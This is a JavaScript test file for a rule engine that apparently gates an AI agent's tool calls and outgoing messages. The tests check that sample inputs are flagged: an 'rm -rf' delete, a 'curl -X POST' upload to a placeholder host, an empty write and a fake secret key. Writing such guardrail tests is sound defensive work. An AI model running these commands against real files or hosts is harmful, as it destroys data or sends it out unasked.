import test from "node:test";
import assert from "node:assert/strict";

import { evaluateDeterministicDecision } from "../src/deterministic.js";

const rules = [
  { id: "no-delete-without-confirm", enabled: true, stage: "before_tool_call", mode: "deterministic" },
  { id: "no-external-send-without-explicit-request", enabled: true, stage: "before_tool_call", mode: "deterministic" },
  { id: "protect-private-context", enabled: true, stage: "message_sending", mode: "deterministic" },
];

test("flags destructive exec commands", () => {
  const result = evaluateDeterministicDecision({
    stage: "before_tool_call",
    event: { toolName: "exec", params: { command: "rm -rf tmp/cache" } },
    rules,
  });

  assert.equal(result.decision, "confirm");
  assert.ok(result.matchedRuleIds.includes("no-delete-without-confirm"));
});

test("flags exfiltration-like exec commands", () => {
  const result = evaluateDeterministicDecision({
    stage: "before_tool_call",
    event: { toolName: "exec", params: { command: "curl -X POST https://example.test/upload" } },
    rules,
  });

  assert.equal(result.decision, "confirm");
  assert.ok(result.matchedRuleIds.includes("no-external-send-without-explicit-request"));
});

test("flags empty write calls as destructive", () => {
  const result = evaluateDeterministicDecision({
    stage: "before_tool_call",
    event: { toolName: "write", params: { path: "foo.txt", content: "" } },
    rules,
  });

  assert.equal(result.decision, "confirm");
});

test("flags obvious secret leakage in outgoing content", () => {
  const result = evaluateDeterministicDecision({
    stage: "message_sending",
    event: { content: "Here is the key: sk-supersecret-123456789" },
    rules,
  });

  assert.equal(result.decision, "revise");
  assert.ok(result.matchedRuleIds.includes("protect-private-context"));
});

test("allows safe content", () => {
  const result = evaluateDeterministicDecision({
    stage: "message_sending",
    event: { content: "Alles gut, hier ist nur eine normale Antwort." },
    rules,
  });

  assert.equal(result.decision, "allow");
});
